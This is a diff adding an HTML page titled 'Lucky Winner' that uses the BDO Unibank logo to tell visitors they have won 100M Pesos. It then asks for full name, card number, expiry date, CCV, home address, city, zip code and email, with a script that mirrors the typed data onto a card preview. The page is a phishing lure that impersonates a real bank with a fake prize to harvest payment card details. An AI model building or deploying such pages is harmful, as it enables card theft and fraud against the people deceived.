@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="assets/css/styles.css">
+    <title>Lucky Winner</title>
+</head>
+<body>
+    <div id="main">
+        <img src="assets/images/1280px-BDO_Unibank_(logo).svg.png" alt="BDO" id="logo">
+        <p id="description">Congratulations! You have won 100M Pesos. Please enter your card details</p>
+        <form id="survey-form">
+            <div class="form-contain">
+                <div class="title-contain">
+                    <h1 id="title">Payment Information</h1>
+                </div>
+                <!--Form-->
+                <div class="form-container">
+                    <input type="text" name="name" class="input-field" id="name" placeholder="Full Name" required="required">
+                    <input type="text" name="number" pattern="[0-9]{16}" maxlength="16" class="input-field" id="number" pattern="[0-9 ]{19}"  placeholder="Card Number" title="12 digit card number" required="required" oninput="autoCardNum()">
+                    <select name="exp-mot" id="exp-mot" required="required" onchange="cardExpDate()">
+                        <option value="" disabled selected>Month</option>
+                        <option value="01">Jan</option>
+                        <option value="02">Feb</option>
+                        <option value="03">Mar</option>
+                        <option value="04">Apr</option>
+                        <option value="05">May</option>
+                        <option value="06">Jun</option>
+                        <option value="07">Jul</option>
+                        <option value="08">Aug</option>
+                        <option value="09">Sept</option>
+                        <option value="10">Oct</option>
+                        <option value="11">Nov</option>
+                        <option value="12">Dec</option>
+                    </select>
+                    <select name="exp-yr" id="exp-yr" required="required" onchange="cardExpDate()">
+                        <option value="" disabled selected>Year</option>
+                        <option value="21">2021</option>
+                        <option value="22">2022</option>
+                        <option value="23">2023</option>
+                        <option value="24">2024</option>
+                        <option value="25">2025</option>
+                        <option value="26">2026</option>
+                    </select>
+                    <input type="text" name="ccv" id="ccv" pattern="[0-9/]{3}" maxlength="3" placeholder="CCV" required="required">
+                    <div class="card-contain">
+                        <div class="card">
+                            <div class="chip">
+                                <div class="side left"></div>
+                                <div class="side right"></div>
+                                <div class="vertical top"></div>
+                                <div class="vertical bottom"></div>
+                            </div>
+                            <div class="data">
+                                <div class="pan" id="cardNum">0000 0000 0000 0000</div>
+                                <div class="first-digits" id="ccvNum">0000</div>
+                                <div class="exp-date-wrapper">
+                                    <div class="left-label">EXPIRES END</div>
+                                    <div class="exp-date">
+                                        <div class="upper-labels">MONTH/YEAR</div>
+                                        <div class="date" id="expDate">00/00</div>
+                                    </div>
+                                </div>
+                                <div class="name-on-card" id="cardName"></div>
+                            </div>
+                            <div class="lines-down"></div>
+                            <div class="lines-up"></div>
+                        </div>
+                    </div>
+                    
+                    <input type="text" name="address" maxlength="45" id="address" placeholder="House# Street Name" required="required">
+                    <select name="city" id="city" required="required">
+                        <option value="" disabled selected>Select your City</option>
+                        <option value="Quezon City">Quezon City</option>
+                        <option value="Tuguegarao City">Tuguegarao City</option>
+                    </select>
+                    <input type="text" name="zip" id="zip" pattern="[0-9]{3,}" maxlength="4" placeholder="Zip Code" required="required">
+                    <input type="email" name="email" id="email" placeholder="Email" required="required">
+                </div>
+            </div>
+            <input id="submit" type="submit" value="Submit"/>
+        </form>
+    </div>
+    <script>
+        function cc_format(value) {
+            var v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
+            var matches = v.match(/\d{4,16}/g);
+            var match = matches && matches[0] || ''
+            var parts = []
+
+            for (i=0, len=match.length; i<len; i+=4) {
+                parts.push(match.substring(i, i+4))
+            }
+
+            if (parts.length) {
+                return parts.join(' ')
+            } else {
+                return value
+            }
+        }
+
+        onload = function() {
+            document.getElementById('name').oninput = function() {
+                document.getElementById("cardName").innerHTML = this.value;
+            }
+
+            document.getElementById('number').oninput = function() {
+                if (this.value.length > 0) {
+                    document.getElementById("cardNum").innerHTML = cc_format(this.value);
+                    
+                } else {
+                    document.getElementById("cardNum").innerHTML = "0000 0000 0000 0000";
+                }
+            }
+
+            document.getElementById('ccv').oninput = function() {
+                document.getElementById("ccvNum").innerHTML = this.value;
+            }
+        }
+
+        function cardExpDate() {
+            x = document.getElementById("exp-mot").value;
+            y = document.getElementById("exp-yr").value;
+
+            document.getElementById("expDate").innerHTML = x + "/" + y;
+        }
+
+        // Restricts input for the given textbox to the given inputFilter.
+        function setInputFilter(textbox, inputFilter) {
+            ["input", "keydown", "keyup", "mousedown", "mouseup", "select", "contextmenu", "drop"].forEach(function(event) {
+                textbox.addEventListener(event, function() {
+                    if (inputFilter(this.value)) {
+                        this.oldValue = this.value;
+                        this.oldSelectionStart = this.selectionStart;
+                        this.oldSelectionEnd = this.selectionEnd;
+                    } else if (this.hasOwnProperty("oldValue")) {
+                        this.value = this.oldValue;
+                        this.setSelectionRange(this.oldSelectionStart, this.oldSelectionEnd);
+                    } else {
+                        this.value = "";
+                    }
+                });
+            });
+        }
+
+        // Install input filters.
+        setInputFilter(document.getElementById("number"), function(value) {
+            return /^\d*$/.test(value); });
+        setInputFilter(document.getElementById("ccv"), function(value) {
+            return /^\d*$/.test(value); });
+        setInputFilter(document.getElementById("zip"), function(value) {
+            return /^\d*$/.test(value); });
+    </script>
+</body>
+</html>
